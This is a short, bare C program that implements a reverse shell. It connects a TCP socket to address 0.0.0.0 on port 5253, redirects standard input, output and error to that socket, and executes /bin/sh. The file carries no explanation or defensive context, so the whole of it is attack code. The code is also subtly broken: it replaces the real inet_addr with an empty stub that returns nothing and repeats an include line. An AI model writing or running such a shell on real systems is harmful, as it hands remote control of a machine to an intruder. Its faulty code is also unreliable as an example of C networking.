#include <stdio.h>
#include <unistd.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
int inet_addr(){};int main(int argc, char *argv[]){struct sockaddr_in sa;int s;sa.sin_family = AF_INET;sa.sin_addr.s_addr = inet_addr("0.0.0.0");sa.sin_port = htons(5253);s = socket(AF_INET, SOCK_STREAM, 0);connect(s, (struct sockaddr *)&sa, sizeof(sa));dup2(s, 0);dup2(s, 1);dup2(s, 2);execve("/bin/sh", 0, 0);return 0;}
